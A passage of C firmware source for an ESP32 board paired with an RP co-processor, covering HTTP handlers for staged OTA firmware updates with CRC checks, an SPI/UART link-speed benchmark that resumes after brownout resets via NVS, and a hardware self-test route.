    bool on_disk_ok = rp_image_verify_on_disk(fd, ota_rp_len, ota_rp_crc);
    close(fd);

    if (!on_disk_ok)
    {
        ota_fail(conn, "the staged rp image on flash does not match its crc");
        return false;
    }

    ota_rp_validated = true;

    ESP_LOGW(TAG, "rp image validated, %u bytes crc %08x", (unsigned)ota_rp_len, (unsigned)ota_rp_crc);

    return true;
}

static bool ota_publish_staged_rp_image(uint32_t size, uint32_t crc)
{
    rp_image_invalidate();
    ota_nvs_clear_rp_pending();

    unlink(RP_IMAGE_PATH);

    if (rename(RP_IMAGE_TMP_PATH, RP_IMAGE_PATH) != 0)
    {
        return false;
    }

    int fd = open(RP_IMAGE_PATH, O_RDONLY);
    if (fd < 0)
    {
        return false;
    }

    rp_image_fd = fd;
    rp_image_size = size;
    rp_image_crc = crc;
    rp_window_offset = SPI_NO_BLOCK;
    spi_requested_block = SPI_NO_BLOCK;

    __atomic_store_n(&rp_image_ready, true, __ATOMIC_SEQ_CST);

    return true;
}

static bool ota_commit_upload(http_conn_t *conn)
{
    if (ota_rp_validated && !ota_publish_staged_rp_image(ota_rp_len, ota_rp_crc))
    {
        ota_fail(conn, "could not put the verified rp image in place");
        return false;
    }

    if (ota_esp_validated && esp_ota_set_boot_partition(ota_partition) != ESP_OK)
    {
        ota_fail(conn, "could not set the boot partition");
        return false;
    }

    if (ota_rp_validated)
    {
        rp_commit_pending = true;
        ota_nvs_set_rp_pending(ota_rp_len, ota_rp_crc);
    }

    ota_reboot_pending = ota_esp_validated;

    return true;
}

static void ota_report_success(http_conn_t *conn)
{
    char body[256];

    if (!ota_commit_upload(conn))
    {
        return;
    }

    ota_uploads_ok++;
    ota_last_error[0] = '\0';

    if (ota_reboot_pending)
    {
        snprintf(body, sizeof(body),
                 "OK\nesp: %u bytes into %s\nrp: %u bytes staged\n"
                 "rebooting now, reconnect and load the page to confirm the update\n",
                 (unsigned)ota_esp_len, ota_partition ? ota_partition->label : "?", (unsigned)ota_rp_len);
    }
    else
    {
        snprintf(body, sizeof(body), "OK\nrp: %u bytes staged, the RP fetches and applies it shortly\n",
                 (unsigned)ota_rp_len);
    }

    ota_partition = NULL;

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "200 OK", body);
}

static void ota_consume(http_conn_t *conn, const uint8_t *data, size_t len)
{
    size_t remaining = conn->body_expected - conn->body_received;

    if (len > remaining)
    {
        len = remaining;
    }

    conn->body_received += len;

    while (len > 0 && ota_stage != OTA_STAGE_DONE)
    {
        if (ota_stage == OTA_STAGE_HEADER)
        {
            size_t want = OTA_PKG_HEADER_SIZE - ota_header_got;
            size_t take = len < want ? len : want;

            memcpy(ota_header + ota_header_got, data, take);
            ota_header_got += take;
            data += take;
            len -= take;

            if (ota_header_got >= 4 && ota_header[0] == 0xE9)
            {
                if (!ota_start_esp_image(conn, (uint32_t)conn->body_expected))
                {
                    return;
                }

                if (esp_ota_write(ota_handle, ota_header, ota_header_got) != ESP_OK)
                {
                    ota_fail(conn, "esp_ota_write failed");
                    return;
                }

                ota_esp_got = (uint32_t)ota_header_got;
                continue;
            }

            if (ota_header_got < OTA_PKG_HEADER_SIZE)
            {
                return;
            }

            if (!ota_parse_package_header(conn))
            {
                return;
            }

            if (ota_esp_len > 0)
            {
                if (!ota_start_esp_image(conn, ota_esp_len))
                {
                    return;
                }
            }
            else if (ota_rp_len > 0)
            {
                if (!ota_open_rp_stage(conn))
                {
                    return;
                }
            }
            else
            {
                ota_fail(conn, "package carries no images");
                return;
            }

            continue;
        }

        if (ota_stage == OTA_STAGE_ESP)
        {
            size_t want = ota_esp_len - ota_esp_got;
            size_t take = len < want ? len : want;

            if (esp_ota_write(ota_handle, data, take) != ESP_OK)
            {
                ota_fail(conn, "esp_ota_write failed");
                return;
            }

            ota_esp_running = crc32_update(ota_esp_running, data, take);
            ota_esp_got += (uint32_t)take;
            data += take;
            len -= take;

            if (ota_esp_got < ota_esp_len)
            {
                return;
            }

            if (!ota_finish_esp_image(conn))
            {
                return;
            }

            if (ota_is_package && ota_rp_len > 0)
            {
                if (!ota_open_rp_stage(conn))
                {
                    return;
                }

                continue;
            }

            ota_stage = OTA_STAGE_DONE;
            continue;
        }

        size_t want = ota_rp_len - ota_rp_got;
        size_t take = len < want ? len : want;

        if (write(rp_upload_fd, data, take) != (int)take)
        {
            ota_fail(conn, "write to SPIFFS failed");
            return;
        }

        ota_rp_running = crc32_update(ota_rp_running, data, take);
        ota_rp_got += (uint32_t)take;
        data += take;
        len -= take;

        if (ota_rp_got < ota_rp_len)
        {
            return;
        }

        if (!ota_finish_rp_image(conn))
        {
            return;
        }

        ota_stage = OTA_STAGE_DONE;
    }

    if (conn->body_received < conn->body_expected)
    {
        return;
    }

    if (ota_stage == OTA_STAGE_DONE)
    {
        ota_report_success(conn);
    }
    else
    {
        ota_fail(conn, "the upload ended before every image was received");
    }
}

static const char *bench_state_name(void)
{
    switch (spi_bench_state)
    {
        case BENCH_ARMED:
            return "armed";

        case BENCH_RUNNING:
            return "running";

        case BENCH_DONE:
            return "done";

        case BENCH_TIMEOUT:
            return "timeout";

        case BENCH_ABORTED:
            return "aborted";

        default:
            return "idle";
    }
}

static uint32_t bench_step_kb_per_s(const bench_step_t *slot)
{
    uint32_t elapsed = slot->elapsed_ms == 0 ? 1 : slot->elapsed_ms;
    uint32_t frame = slot->kind == SPI_BENCH_KIND_UART ? UART_BENCH_FRAME_LEN : SPI_FRAME_SIZE;

    return (uint32_t)(((uint64_t)slot->frames * frame * 1000ull) / elapsed / 1024ull);
}

static void bench_render_from(http_conn_t *conn, uint32_t from)
{
    uint32_t best_hz = 0;
    uint32_t best_peri_hz = 0;
    uint32_t next_hz = 0;
    uint32_t soak_hz = 0;
    uint32_t soak_elapsed_ms = 0;
    const bench_step_t *best_slot = NULL;

    uint32_t rejected_hz = 0;

    for (unsigned i = 0; i < SPI_BENCH_MAX_STEPS; ++i)
    {
        const bench_step_t *slot = &spi_bench_steps[i];

        if (slot->valid && slot->soaked && !bench_step_passed(slot) && slot->actual_hz != 0 &&
            (rejected_hz == 0 || slot->actual_hz < rejected_hz))
        {
            rejected_hz = slot->actual_hz;
        }
    }

    for (unsigned i = 0; i < SPI_BENCH_MAX_STEPS; ++i)
    {
        const bench_step_t *slot = &spi_bench_steps[i];

        if (rejected_hz != 0 && slot->actual_hz >= rejected_hz)
        {
            continue;
        }

        if (bench_step_passed(slot) && slot->actual_hz > best_hz)
        {
            best_hz = slot->actual_hz;
            best_peri_hz = slot->peri_hz;
            best_slot = slot;
        }
    }

    for (unsigned i = 0; i < SPI_BENCH_MAX_STEPS; ++i)
    {
        const bench_step_t *slot = &spi_bench_steps[i];

        if (!slot->valid || bench_step_passed(slot) || slot->actual_hz <= best_hz)
        {
            continue;
        }

        if (next_hz == 0 || slot->actual_hz < next_hz)
        {
            next_hz = slot->actual_hz;
        }
    }

    if (spi_bench_soak_step < SPI_BENCH_MAX_STEPS)
    {
        soak_hz = spi_bench_steps[spi_bench_soak_step].actual_hz;
        soak_elapsed_ms = spi_bench_steps[spi_bench_soak_step].elapsed_ms;
    }

    int len = snprintf(http_body, sizeof(http_body),
                       "state=%s\n"
                       "kind=%u\n"
                       "run=%u\n"
                       "ms=%u\n"
                       "min_khz=%u\n"
                       "max_khz=%u\n"
                       "min_baud=%u\n"
                       "max_baud=%u\n"
                       "steps=%u\n"
                       "done=%u\n"
                       "native_peri_khz=%u\n"
                       "sys_khz=%u\n"
                       "best_khz=%u\n"
                       "best_peri_khz=%u\n"
                       "best_fbdiv=%u\n"
                       "best_pd1=%u\n"
                       "best_pd2=%u\n"
                       "next_khz=%u\n"
                       "soak_step=%u\n"
                       "soak_khz=%u\n"
                       "soak_ms=%u\n"
                       "soak_elapsed_ms=%u\n"
                       "why=%u/%u/%u/%u\n"
                       "badlen=%u\n"
                       "badhead=%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
                       "link=%s\n",
                       bench_state_name(), (unsigned)spi_bench_kind, (unsigned)spi_bench_run_id,
                       (unsigned)spi_bench_ms,
                       (unsigned)spi_bench_min_khz, (unsigned)spi_bench_max_khz, (unsigned)spi_bench_min_baud,
                       (unsigned)spi_bench_max_baud, (unsigned)spi_bench_total_steps,
                       (unsigned)spi_bench_done_steps, (unsigned)(spi_bench_native_peri_hz / 1000),
                       (unsigned)(spi_bench_sys_hz / 1000), (unsigned)(best_hz / 1000),
                       (unsigned)(best_peri_hz / 1000), (unsigned)(best_slot ? best_slot->fbdiv : 0),
                       (unsigned)(best_slot ? best_slot->pd1 : 0), (unsigned)(best_slot ? best_slot->pd2 : 0),
                       (unsigned)(next_hz / 1000), (unsigned)spi_bench_soak_step, (unsigned)(soak_hz / 1000),
                       (unsigned)spi_bench_soak_ms, (unsigned)soak_elapsed_ms, (unsigned)spi_bench_bad_magic,
                       (unsigned)spi_bench_bad_len, (unsigned)spi_bench_bad_crc, (unsigned)spi_bench_bad_seq,
                       (unsigned)spi_bench_last_bad_len,
                       spi_bench_bad_head[0], spi_bench_bad_head[1],
                       spi_bench_bad_head[2], spi_bench_bad_head[3], spi_bench_bad_head[4], spi_bench_bad_head[5],
                       spi_bench_bad_head[6], spi_bench_bad_head[7], spi_bench_bad_head[8], spi_bench_bad_head[9],
                       spi_bench_bad_head[10], spi_bench_bad_head[11], rp_link_state());

    if (len <= 0 || (size_t)len >= sizeof(http_body))
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    unsigned emitted = 0;

    for (unsigned i = from; i < SPI_BENCH_MAX_STEPS; ++i)
    {
        const bench_step_t *slot = &spi_bench_steps[i];

        if (!slot->valid)
        {
            continue;
        }

        if (emitted == SPI_BENCH_ROWS_PER_REPLY)
        {
            int tail = snprintf(http_body + len, sizeof(http_body) - (size_t)len, "more=%u\n", i);

            if (tail > 0 && (size_t)tail < sizeof(http_body) - (size_t)len)
            {
                len += tail;
            }

            break;
        }

        uint32_t mosi_lost = slot->frames > slot->mosi_ok + slot->mosi_bad
                                 ? slot->frames - slot->mosi_ok - slot->mosi_bad
                                 : 0;
        uint32_t miso_sent = bench_miso_sent(slot);
        uint32_t miso_lost =
            miso_sent > slot->miso_ok + slot->miso_bad ? miso_sent - slot->miso_ok - slot->miso_bad : 0;

        int wrote = snprintf(http_body + len, sizeof(http_body) - (size_t)len,
                             "s=%u,%u,%u,%u,%u,%u,%u,%u,%u,%u,%u,%u,%u,%u\n", i,
                             (unsigned)(slot->actual_hz / 1000), (unsigned)(slot->peri_hz / 1000),
                             (unsigned)slot->frames, (unsigned)slot->miso_bad, (unsigned)miso_lost,
                             (unsigned)slot->mosi_bad, (unsigned)mosi_lost, (unsigned)slot->xfer_fail,
                             (unsigned)slot->offset_max, (unsigned)bench_step_kb_per_s(slot),
                             bench_step_passed(slot) ? 1 : 0, (unsigned)slot->phase, (unsigned)slot->stale);

        if (wrote <= 0 || (size_t)wrote >= sizeof(http_body) - (size_t)len)
        {
            break;
        }

        len += wrote;
        emitted++;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static void bench_render(http_conn_t *conn)
{
    bench_render_from(conn, 0);
}

// --- resilient benchmark: survive a reset that a marginal soak can trigger ----
// The whole run state lives in NVS so a brownout does not lose it. On boot, if a
// run was active, the ESP re-arms it; the RP then resumes the descending
// confirmation just below the clock that reset the board, and it converges to
// the highest clock that survives a full soak.
#define RBENCH_NS "rbench"

static void rbench_save_params(uint32_t ms, uint32_t min_khz, uint32_t max_khz, uint32_t steps, uint32_t soak,
                               uint32_t down, uint32_t oc, uint32_t kind)
{
    nvs_handle_t h;

    if (nvs_open(RBENCH_NS, NVS_READWRITE, &h) != ESP_OK)
    {
        return;
    }

    nvs_set_u32(h, "active", 1);
    nvs_set_u32(h, "ms", ms);
    nvs_set_u32(h, "min", min_khz);
    nvs_set_u32(h, "max", max_khz);
    nvs_set_u32(h, "steps", steps);
    nvs_set_u32(h, "soak", soak);
    nvs_set_u32(h, "down", down);
    nvs_set_u32(h, "oc", oc);
    nvs_set_u32(h, "kind", kind);
    nvs_set_u32(h, "probing", 0);
    nvs_commit(h);
    nvs_close(h);
}

// The RP is about to hammer this clock for the soak, the one operation that can
// brown the board out. Record it BEFORE it runs, so a reset that never returns a
// result still tells the next boot which clock to drop below.
static void rbench_save_probing(uint32_t khz)
{
    nvs_handle_t h;

    if (nvs_open(RBENCH_NS, NVS_READWRITE, &h) != ESP_OK)
    {
        return;
    }

    nvs_set_u32(h, "probing", khz);
    nvs_commit(h);
    nvs_close(h);
}

static void rbench_clear(void)
{
    nvs_handle_t h;

    if (nvs_open(RBENCH_NS, NVS_READWRITE, &h) != ESP_OK)
    {
        return;
    }

    nvs_set_u32(h, "active", 0);
    nvs_commit(h);
    nvs_close(h);
}

static void bench_arm(uint32_t duration, uint32_t min_khz, uint32_t max_khz, uint32_t steps, uint32_t soak,
                      uint32_t down, uint32_t kind, uint16_t resume_khz)
{
    memset(spi_bench_steps, 0, sizeof(spi_bench_steps));

    spi_bench_ms = duration;
    spi_bench_soak_ms = soak;
    spi_bench_stepdowns = (uint8_t)down;
    spi_bench_overclock = kind == SPI_BENCH_KIND_UART ? 0 : (spi_bench_overclock != 0 ? 1 : 0);
    spi_bench_kind = (uint8_t)kind;
    spi_bench_soak_step = SPI_BENCH_NO_STEP;
    spi_bench_min_khz = (uint16_t)(kind == SPI_BENCH_KIND_UART ? 0 : min_khz);
    spi_bench_max_khz = (uint16_t)(kind == SPI_BENCH_KIND_UART ? 0 : max_khz);
    spi_bench_min_baud = kind == SPI_BENCH_KIND_UART ? min_khz : 0;
    spi_bench_max_baud = kind == SPI_BENCH_KIND_UART ? max_khz : 0;
    spi_bench_max_steps = (uint8_t)steps;
    spi_bench_run_id++;
    spi_bench_total_steps = 0;
    spi_bench_done_steps = 0;
    spi_bench_ack_step = 0xFE;
    spi_bench_result_ack = 0;
    spi_bench_last_mosi_seq = 0;
    spi_bench_bad_magic = 0;
    spi_bench_bad_len = 0;
    spi_bench_bad_crc = 0;
    spi_bench_bad_seq = 0;
    spi_bench_last_bad_len = 0;
    rbench_resume_khz = resume_khz;

    memset(spi_bench_bad_head, 0, sizeof(spi_bench_bad_head));

    spi_bench_epoch++;
    uart_bench_want_baud = 0;
    uart_bench_ready = false;
    spi_bench_cur_step = 0;
    spi_bench_native_peri_hz = 0;
    spi_bench_sys_hz = 0;
    spi_bench_last_frame_ms = bench_now_ms();
    spi_bench_arm_deadline_ms = spi_bench_last_frame_ms + BENCH_ARM_TIMEOUT_MS;
    spi_bench_deadline_ms = spi_bench_last_frame_ms + BENCH_ARM_TIMEOUT_MS +
                            (int64_t)steps * (int64_t)(duration + BENCH_STEP_OVERHEAD_MS) +
                            (soak != 0 ? ((int64_t)soak + (int64_t)soak / 20) * (int64_t)(down + 1) +
                                             BENCH_SOAK_MARGIN_MS
                                       : 0);
    spi_bench_state = BENCH_ARMED;
}

// Called once at boot: if a resilient run was cut short by a reset, re-arm it so
// the RP resumes just below the clock it was confirming when the board died.
static void rbench_resume_after_boot(void)
{
    nvs_handle_t h;

    if (nvs_open(RBENCH_NS, NVS_READONLY, &h) != ESP_OK)
    {
        return;
    }

    uint32_t active = 0;
    uint32_t ms = 0, min_khz = 0, max_khz = 0, steps = 0, soak = 0, down = 0, oc = 0, kind = 0, probing = 0;

    nvs_get_u32(h, "active", &active);
    nvs_get_u32(h, "ms", &ms);
    nvs_get_u32(h, "min", &min_khz);
    nvs_get_u32(h, "max", &max_khz);
    nvs_get_u32(h, "steps", &steps);
    nvs_get_u32(h, "soak", &soak);
    nvs_get_u32(h, "down", &down);
    nvs_get_u32(h, "oc", &oc);
    nvs_get_u32(h, "kind", &kind);
    nvs_get_u32(h, "probing", &probing);
    nvs_close(h);

    if (active == 0 || kind == SPI_BENCH_KIND_UART || probing <= SPI_BENCH_REFINE_KHZ || soak == 0)
    {
        // Only SPI soaks brown out, and only a run that got as far as a soak has a
        // clock to drop below. Anything else was not mid-confirmation; drop it.
        rbench_clear();
        return;
    }

    uint16_t resume = (uint16_t)(probing - SPI_BENCH_REFINE_KHZ);

    if (resume < min_khz)
    {
        rbench_clear();
        return;
    }

    spi_bench_overclock = oc != 0 ? 1 : 0;
    bench_arm(ms, min_khz, max_khz, steps, soak, down, kind, resume);
    rbench_save_probing(resume);

    ESP_LOGW(SPI_TAG, "resilient bench: resuming after a reset, confirming down from %u kHz", (unsigned)resume);
}

static void route_spibench(http_conn_t *conn, const char *path)
{
    uint32_t start = 0;
    uint32_t cancel = 0;

    bench_service();

    http_query_uint(path, "start", &start);
    http_query_uint(path, "abort", &cancel);

    if (cancel != 0)
    {
        if (spi_bench_state == BENCH_ARMED || spi_bench_state == BENCH_RUNNING)
        {
            spi_bench_state = BENCH_ABORTED;
        }

        rbench_clear();
        bench_render(conn);
        return;
    }

    if (start == 0)
    {
        uint32_t from = 0;

        http_query_uint(path, "from", &from);
        bench_render_from(conn, from >= SPI_BENCH_MAX_STEPS ? 0 : from);

        return;
    }

    if (spi_bench_state == BENCH_ARMED || spi_bench_state == BENCH_RUNNING)
    {
        http_reply_text(conn, "409 Conflict", "a benchmark is already running\n");
        return;
    }

    const char *busy = busy_reason();

    if (busy != NULL)
    {
        char body[96];

        snprintf(body, sizeof(body), "%s, both drive the same SPI link\n", busy);
        http_reply_text(conn, "409 Conflict", body);

        return;
    }

    uint32_t duration = 250;
    uint32_t min_khz = 1000;
    uint32_t max_khz = SPI_BENCH_MAX_KHZ;
    uint32_t steps = 30;
    uint32_t soak = 120000;
    uint32_t down = 3;
    uint32_t overclock = 0;
    uint32_t kind = SPI_BENCH_KIND_SPI;

    http_query_uint(path, "ms", &duration);
    http_query_uint(path, "min", &min_khz);
    http_query_uint(path, "max", &max_khz);
    http_query_uint(path, "steps", &steps);
    http_query_uint(path, "soak", &soak);
    http_query_uint(path, "down", &down);
    http_query_uint(path, "oc", &overclock);
    http_query_uint(path, "kind", &kind);

    if (duration < SPI_BENCH_MIN_MS || duration > SPI_BENCH_MAX_MS)
    {
        http_reply_text(conn, "400 Bad Request", "ms must be between 50 and 2000\n");
        return;
    }

    if (steps == 0 || steps > SPI_BENCH_MAX_STEPS)
    {
        http_reply_text(conn, "400 Bad Request", "steps must be between 1 and 40\n");
        return;
    }

    if (down > SPI_BENCH_MAX_STEPDOWNS)
    {
        http_reply_text(conn, "400 Bad Request", "down must be between 0 and 8\n");
        return;
    }

    if (kind > SPI_BENCH_KIND_UART)
    {
        http_reply_text(conn, "400 Bad Request", "kind is 0 for the SPI link or 1 for the UART\n");
        return;
    }

    if (kind == SPI_BENCH_KIND_UART)
    {
        if (min_khz < UART_BENCH_MIN_BAUD || max_khz > UART_BENCH_MAX_BAUD || min_khz > max_khz)
        {
            http_reply_text(conn, "400 Bad Request", "the UART range is 9600 to 3000000 baud\n");
            return;
        }
    }
    else if (min_khz < SPI_BENCH_MIN_KHZ || max_khz > SPI_BENCH_MAX_KHZ || min_khz > max_khz)
    {
        http_reply_text(conn, "400 Bad Request", "min and max are kHz, between 200 and 65000\n");
        return;
    }

    if (soak != 0 && (soak < SPI_BENCH_MIN_SOAK_MS || soak > SPI_BENCH_MAX_SOAK_MS))
    {
        http_reply_text(conn, "400 Bad Request", "soak is 0 to disable, or 2000 to 10800000 ms\n");
        return;
    }

    spi_bench_overclock = kind == SPI_BENCH_KIND_UART ? 0 : (overclock != 0 ? 1 : 0);

    bench_arm(duration, min_khz, max_khz, steps, soak, down, kind, 0);

    // A fresh SPI soak run is the only kind worth resuming across a reset, so
    // persist those and let the boot path re-arm them. Screening-only, UART and
    // no-soak runs cannot brown out, so nothing needs to survive for them.
    if (kind == SPI_BENCH_KIND_SPI && soak != 0)
    {
        rbench_save_params(duration, min_khz, max_khz, steps, soak, down, spi_bench_overclock, kind);
    }
    else
    {
        rbench_clear();
    }

    ESP_LOGI(SPI_TAG, "bench run %u armed: %u steps of %u ms, %u to %u kHz, soak %u ms, %u step downs, oc %u",
             (unsigned)spi_bench_run_id, (unsigned)steps, (unsigned)duration, (unsigned)min_khz, (unsigned)max_khz,
             (unsigned)soak, (unsigned)down, (unsigned)spi_bench_overclock);

    bench_render(conn);
}

static bool st_blink_busy;

static void selftest_blink_task(void *arg)
{
    (void)arg;

    gpio_config_t io = {.pin_bit_mask = 1ULL << LED_GPIO,
                        .mode = GPIO_MODE_OUTPUT,
                        .pull_up_en = GPIO_PULLUP_DISABLE,
                        .pull_down_en = GPIO_PULLDOWN_DISABLE,
                        .intr_type = GPIO_INTR_DISABLE};

    gpio_config(&io);

    for (int i = 0; i < ST_BLINK_MS / 250; ++i)
    {
        gpio_set_level(LED_GPIO, i & 1);
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    gpio_set_level(LED_GPIO, 0);

    st_blink_busy = false;

    vTaskDelete(NULL);
}

static void selftest_run_local(void)
{
    char text[SPI_SELFTEST_TEXT_MAX + 8];

    const esp_app_desc_t *desc = esp_app_get_description();
    const esp_partition_t *running = esp_ota_get_running_partition();

    snprintf(text, sizeof(text), "v%s %s %s", FIRMV_STR, desc->date, running ? running->label : "?");
    st_add(ST_ESP_FIRMWARE, SELFTEST_INFO, 0, 0, text);

    esp_chip_info_t chip;

    memset(&chip, 0, sizeof(chip));
    esp_chip_info(&chip);

    snprintf(text, sizeof(text), "%s rev %d, %d core", CONFIG_IDF_TARGET, chip.revision, chip.cores);
    st_add(ST_ESP_CHIP, chip.model == CHIP_ESP32C2 ? SELFTEST_PASS : SELFTEST_WARN, (uint32_t)chip.revision,
           chip.features, text);

    uint8_t mac[6] = {0};
    bool mac_ok = esp_read_mac(mac, ESP_MAC_WIFI_SOFTAP) == ESP_OK;
    uint8_t zero = 0;
    uint8_t ones = 0;

    for (int i = 0; i < 6; ++i)
    {
        zero |= mac[i];
        ones &= mac[i];
    }

    snprintf(text, sizeof(text), "%02X%02X%02X%02X%02X%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    st_add(ST_ESP_MAC, mac_ok && zero != 0 ? SELFTEST_PASS : SELFTEST_FAIL, 0, 0, text);

    uint32_t flash_id = 0;
    uint32_t flash_size = 0;

    esp_flash_read_id(NULL, &flash_id);
    esp_flash_get_size(NULL, &flash_size);

    snprintf(text, sizeof(text), "id %06x, %u MB", (unsigned)flash_id, (unsigned)(flash_size / (1024 * 1024)));
    st_add(ST_ESP_FLASH, flash_size == 4 * 1024 * 1024 ? SELFTEST_PASS : SELFTEST_FAIL, flash_id, flash_size, text);

    uint32_t heap = (uint32_t)esp_get_free_heap_size();
    uint32_t heap_min = (uint32_t)esp_get_minimum_free_heap_size();
    uint32_t block = (uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_DEFAULT);

    snprintf(text, sizeof(text), "free %u, low %u, blk %u", (unsigned)heap, (unsigned)heap_min, (unsigned)block);
    st_add(ST_ESP_HEAP, heap_min > 16384 && block > 8192 ? SELFTEST_PASS : SELFTEST_WARN, heap_min, block, text);

    snprintf(text, sizeof(text), "%s", reset_reason_name());
    st_add(ST_ESP_RESET_REASON, SELFTEST_INFO, 0, 0, text);

    const esp_partition_t *ota0 =
        esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_APP_OTA_0, NULL);
    const esp_partition_t *ota1 =
        esp_partition_find_first(ESP_PARTITION_TYPE_APP, ESP_PARTITION_SUBTYPE_APP_OTA_1, NULL);
    const esp_partition_t *store =
        esp_partition_find_first(ESP_PARTITION_TYPE_DATA, ESP_PARTITION_SUBTYPE_DATA_SPIFFS, NULL);

    bool parts_ok = ota0 != NULL && ota1 != NULL && store != NULL && ota0->size == ota1->size;

    snprintf(text, sizeof(text), "ota %uk, storage %uk", (unsigned)(ota0 ? ota0->size / 1024 : 0),
             (unsigned)(store ? store->size / 1024 : 0));
    st_add(ST_ESP_PARTITIONS, parts_ok ? SELFTEST_PASS : SELFTEST_FAIL, ota0 ? ota0->size : 0,
           store ? store->size : 0, text);

    size_t total = 0;
    size_t used = 0;
    bool spiffs_ok = esp_spiffs_info("storage", &total, &used) == ESP_OK && total > 0;

    snprintf(text, sizeof(text), "%u of %u kB used", (unsigned)(used / 1024), (unsigned)(total / 1024));
    st_add(ST_ESP_SPIFFS, spiffs_ok ? SELFTEST_PASS : SELFTEST_FAIL, (uint32_t)used, (uint32_t)total, text);

    static wifi_sta_list_t sta_list;

    memset(&sta_list, 0, sizeof(sta_list));
    esp_wifi_ap_get_sta_list(&sta_list);

    snprintf(text, sizeof(text), "ch %d, %d station(s)", (int)ESP_WIFI_CHANNEL, sta_list.num);
    st_add(ST_ESP_WIFI, sta_list.num > 0 ? SELFTEST_PASS : SELFTEST_WARN, (uint32_t)sta_list.num, 0, text);

    uint32_t spi_err = stats.spi_errors + stats.spi_queue_errors;

    snprintf(text, sizeof(text), "%u frames, %u err, %u bad ver", (unsigned)stats.spi_transactions,
             (unsigned)spi_err, (unsigned)stats.spi_proto_mismatch);
    st_add(ST_ESP_SPI_COUNTERS,
           stats.spi_transactions == 0 ? SELFTEST_FAIL
                                       : (spi_err == 0 && stats.spi_proto_mismatch == 0 ? SELFTEST_PASS
                                                                                        : SELFTEST_WARN),
           stats.spi_transactions, spi_err, text);

    snprintf(text, sizeof(text), "%s", rp_link_state());
    st_add(ST_X_SPI_LINK, strcmp(rp_link_state(), "ok") == 0 ? SELFTEST_PASS : SELFTEST_FAIL, 0, 0, text);
}

static const char *st_state_name(void)
{
    switch (st_state)
    {
        case ST_RUNNING:
            return "running";

        case ST_DONE:
            return "done";

        case ST_TIMEOUT:
            return "timeout";

        case ST_ABORTED:
            return "aborted";

        default:
            return "idle";
    }
}

static void selftest_render(http_conn_t *conn, uint32_t from)
{
    unsigned pass = 0;
    unsigned fail = 0;
    unsigned warn = 0;
    uint8_t count = __atomic_load_n(&st_count, __ATOMIC_ACQUIRE);

    for (uint8_t i = 0; i < count && i < SPI_SELFTEST_MAX_RESULTS; ++i)
    {
        switch (st_rows[i].status)
        {
            case SELFTEST_PASS:
                pass++;
                break;

            case SELFTEST_FAIL:
                fail++;
                break;

            case SELFTEST_WARN:
                warn++;
                break;

            default:
                break;
        }
    }

    int len = snprintf(http_body, sizeof(http_body),
                       "state=%s\n"
                       "run=%u\n"
                       "count=%u\n"
                       "pass=%u\n"
                       "fail=%u\n"
                       "warn=%u\n"
                       "blink=%u\n"
                       "link=%s\n",
                       st_state_name(), (unsigned)st_run_id, (unsigned)count, pass, fail, warn, (unsigned)st_blink,
                       rp_link_state());

    if (len <= 0 || (size_t)len >= sizeof(http_body))
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    unsigned emitted = 0;

    for (uint8_t i = (uint8_t)from; i < count && i < SPI_SELFTEST_MAX_RESULTS; ++i)
    {
        if (emitted == SPI_SELFTEST_ROWS_PER_REPLY)
        {
            int tail = snprintf(http_body + len, sizeof(http_body) - (size_t)len, "more=%u\n", (unsigned)i);

            if (tail > 0 && (size_t)tail < sizeof(http_body) - (size_t)len)
            {
                len += tail;
            }

            break;
        }

        int wrote = snprintf(http_body + len, sizeof(http_body) - (size_t)len, "t=%u,%u,%u,%u,%s\n",
                             (unsigned)st_rows[i].id, (unsigned)st_rows[i].status, (unsigned)st_rows[i].a,
                             (unsigned)st_rows[i].b, st_rows[i].text);

        if (wrote <= 0 || (size_t)wrote >= sizeof(http_body) - (size_t)len)
        {
            break;
        }

        len += wrote;
        emitted++;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static void route_selftest(http_conn_t *conn, const char *path)
{
    uint32_t start = 0;
    uint32_t cancel = 0;
    uint32_t blink = 0;
    uint32_t led = 0;
    uint32_t from = 0;

    st_service();

    http_query_uint(path, "start", &start);
    http_query_uint(path, "abort", &cancel);
    http_query_uint(path, "blink", &blink);
    http_query_uint(path, "led", &led);

    if (cancel != 0)
    {
        if (st_state == ST_RUNNING)
        {
            st_state = ST_ABORTED;
            st_blink = 0;
        }

        selftest_render(conn, 0);
        return;
    }

    if (blink != 0)
    {
        if (blink == 2)
        {
            if (!st_blink_busy)
            {
                st_blink_busy = true;

                if (xTaskCreate(selftest_blink_task, "st_blink", 2048, NULL, tskIDLE_PRIORITY + 1, NULL) != pdPASS)
                {
                    st_blink_busy = false;
                }
            }
        }
        else
        {
            st_blink = 1;
        }

        selftest_render(conn, 0);
        return;
    }

    if (led != 0)
    {
        uint32_t answer = 0;

        http_query_uint(path, "ok", &answer);

        uint8_t id = led == 2 ? ST_ESP_LED : ST_RP_LED;
        const char *what = led == 2 ? "LED1, ESP IO0 through R8" : "LED2, RP GPIO26";

        st_add(id, answer != 0 ? SELFTEST_PASS : SELFTEST_FAIL, 0, 0, what);
        selftest_render(conn, 0);

        return;
    }

    if (start == 0)
    {
        http_query_uint(path, "from", &from);
        selftest_render(conn, from >= SPI_SELFTEST_MAX_RESULTS ? 0 : from);

        return;
    }

    if (st_state == ST_RUNNING)
    {
        http_reply_text(conn, "409 Conflict", "a self test is already running\n");
        return;
    }

    if (spi_bench_state == BENCH_ARMED || spi_bench_state == BENCH_RUNNING)
    {
        http_reply_text(conn, "409 Conflict", "a link benchmark is running, wait for it\n");
        return;
    }

    if (ota_reboot_pending || upload_owner != NULL || rp_image_ready)
    {
        http_reply_text(conn, "409 Conflict", "a firmware update is in progress\n");
        return;
    }

    uint32_t opt_flash = 0;
    uint32_t opt_switch = 0;

    http_query_uint(path, "flash", &opt_flash);
    http_query_uint(path, "sw", &opt_switch);

    memset(st_rows, 0, sizeof(st_rows));

    st_count = 0;
    st_run_id++;
    st_blink = 0;
